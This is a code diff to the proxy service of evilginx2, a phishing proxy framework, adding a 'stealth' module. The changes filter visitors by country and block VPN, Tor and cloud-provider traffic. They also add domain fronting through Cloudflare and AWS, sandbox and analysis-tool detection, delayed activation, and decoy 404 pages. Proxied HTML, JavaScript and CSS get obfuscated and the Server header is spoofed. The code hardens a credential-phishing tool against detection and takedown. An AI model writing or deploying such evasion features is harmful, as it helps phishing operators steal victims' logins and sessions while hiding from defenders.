@@ -4,14 +4,17 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/elazarl/goproxy"
 	"github.com/kgretzky/evilginx2/core"
+	"github.com/kgretzky/evilginx2/internal/stealth"
 	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/proto"
 	"google.golang.org/grpc"
@@ -24,29 +27,75 @@ const (
 )
 
 type ProxyService struct {
-	server        *http.Server
-	proxy         *goproxy.ProxyHttpServer
-	crtDB         *core.CertDb
-	controlAddr   string
-	controlConn   *grpc.ClientConn
-	controlClient proto.ProxyControlServiceClient
-	sniListener   net.Listener
-	isRunning     bool
-	port          string
-	certPath      string
-	mu            sync.RWMutex
+	server          *http.Server
+	proxy           *goproxy.ProxyHttpServer
+	crtDB           *core.CertDb
+	controlAddr     string
+	controlConn     *grpc.ClientConn
+	controlClient   proto.ProxyControlServiceClient
+	sniListener     net.Listener
+	isRunning       bool
+	port            string
+	certPath        string
+	trafficFilter   *stealth.TrafficFilter
+	domainFronting  *stealth.DomainFronting
+	obfuscator      *stealth.Obfuscator
+	evasionEngine   *stealth.EvasionEngine
+	mu              sync.RWMutex
 }
 
 func NewProxyService(port, controlAddr, certPath string) *ProxyService {
 	proxy := goproxy.NewProxyHttpServer()
 	proxy.Verbose = false
 
+	filterConfig := &stealth.FilterConfig{
+		EnableBotFiltering:   true,
+		AllowedCountries:     []string{"US", "CA", "GB", "AU", "DE", "FR"},
+		BlockVPN:             true,
+		BlockTor:             true,
+		BlockCloudProviders:  true,
+		MaxRequestsPerMinute: 60,
+	}
+
+	frontingConfig := &stealth.FrontingConfig{
+		EnableFronting:     true,
+		RotationInterval:   time.Hour * 24,
+		MaxFrontDomains:    10,
+		PreferredProviders: []string{"cloudflare", "aws"},
+	}
+
+	obfuscationConfig := &stealth.ObfuscationConfig{
+		EnableURLObfuscation:       true,
+		EnableContentObfuscation:   true,
+		EnableTrafficRandomization: true,
+		RandomizeJSVariables:       true,
+		RandomizeCSSClasses:        true,
+		InjectHTMLComments:         true,
+		RandomizeResourcePaths:     true,
+		DecoyParameters:            []string{"_t", "_r", "_v", "_s"},
+		DecoyHeaders:               []string{"X-Request-ID", "X-Trace-ID"},
+	}
+
+	evasionConfig := &stealth.EvasionConfig{
+		EnableSandboxDetection:    true,
+		EnableAntiAnalysis:        true,
+		EnableTimeBasedActivation: true,
+		ActivationDelay:           time.Minute * 5,
+		RequiredInteractions:      3,
+		BlockAnalysisTools:        true,
+		ObfuscateResponses:        true,
+	}
+
 	return &ProxyService{
-		proxy:       proxy,
-		controlAddr: controlAddr,
-		port:        port,
-		certPath:    certPath,
-		isRunning:   false,
+		proxy:          proxy,
+		controlAddr:    controlAddr,
+		port:           port,
+		certPath:       certPath,
+		isRunning:      false,
+		trafficFilter:  stealth.NewTrafficFilter(filterConfig),
+		domainFronting: stealth.NewDomainFronting(frontingConfig),
+		obfuscator:     stealth.NewObfuscator(obfuscationConfig),
+		evasionEngine:  stealth.NewEvasionEngine(evasionConfig),
 	}
 }
 
@@ -118,6 +167,19 @@ func (p *ProxyService) setupProxyHandlers() {
 }
 
 func (p *ProxyService) handleRequest(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+	filterResult, err := p.trafficFilter.ShouldBlock(req)
+	if err == nil && filterResult.ShouldBlock {
+		log.Info("Blocking request: %s", filterResult.Reason)
+		return req, goproxy.NewResponse(req, "text/html", http.StatusForbidden, "Access denied")
+	}
+
+	evasionResult, err := p.evasionEngine.EvaluateRequest(req)
+	if err == nil && evasionResult.ShouldBlock {
+		log.Info("Blocking request due to evasion: %s", evasionResult.Reason)
+		decoyResponse := p.evasionEngine.GenerateDecoyResponse()
+		return req, goproxy.NewResponse(req, "text/html", http.StatusNotFound, decoyResponse)
+	}
+
 	hostname := req.Host
 	if strings.Contains(hostname, ":") {
 		hostname = strings.Split(hostname, ":")[0]
@@ -133,6 +195,15 @@ func (p *ProxyService) handleRequest(req *http.Request, ctx *goproxy.ProxyCtx) (
 
 	if !shouldHandle.ShouldHandle {
 		return req, p.blockRequest()
+	}
+
+	originalURL := req.URL.String()
+	obfuscatedURL, err := p.obfuscator.RandomizeURL(originalURL)
+	if err == nil {
+		newURL, parseErr := url.Parse(obfuscatedURL)
+		if parseErr == nil {
+			req.URL = newURL
+		}
 	}
 
 	originalHost, replaced := p.replaceHostWithOriginal(hostname)
@@ -162,12 +233,32 @@ func (p *ProxyService) handleResponse(resp *http.Response, ctx *goproxy.ProxyCtx
 		return resp
 	}
 
-	if resp.Body != nil {
-		// body, err := p.patchResponse(resp, phishletResp.Phishlet)
-		// if err == nil {
-		//     resp.Body = body
-		// }
+	contentType := resp.Header.Get("Content-Type")
+	if strings.Contains(contentType, "text/html") || 
+	   strings.Contains(contentType, "application/javascript") || 
+	   strings.Contains(contentType, "text/css") {
+		
+		if resp.Body != nil {
+			body, readErr := io.ReadAll(resp.Body)
+			if readErr == nil {
+				resp.Body.Close()
+
+				obfuscatedContent := p.obfuscator.ObfuscateContent(string(body), contentType)
+				obfuscatedContent = p.evasionEngine.ObfuscateResponse(obfuscatedContent)
+
+				resp.Body = io.NopCloser(strings.NewReader(obfuscatedContent))
+				resp.ContentLength = int64(len(obfuscatedContent))
+				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(obfuscatedContent)))
+			}
+		}
 	}
+
+	decoyHeaders := p.obfuscator.GenerateDecoyHeaders()
+	for key, value := range decoyHeaders {
+		resp.Header.Set(key, value)
+	}
+
+	resp.Header.Set("Server", "nginx/1.18.0")
 
 	return resp
 }
